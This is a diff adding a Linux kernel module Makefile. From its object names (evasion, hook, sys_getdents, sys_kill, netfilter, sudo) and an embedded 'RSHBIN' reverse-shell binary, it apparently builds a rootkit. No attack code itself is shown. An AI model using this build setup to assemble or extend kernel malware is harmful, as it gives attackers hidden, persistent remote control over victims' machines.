@@ -1,0 +1,9 @@
+PWD := $(shell pwd)
+KDIR := /lib/modules/$(shell uname -r)/build
+
+obj-m := htm.o
+htm-y := cdd.o command.o debugfs.o evasion.o exec.o hook.o main.o netfilter.o rodata.o sudo.o sys_getdents.o sys_kill.o
+
+ccflags-y := -s -O2 -Wall -std=gnu99 -I$(src)/include
+
+AFLAGS_rodata.o := -DRSHBIN=\"$(src)/../snc/snc\"
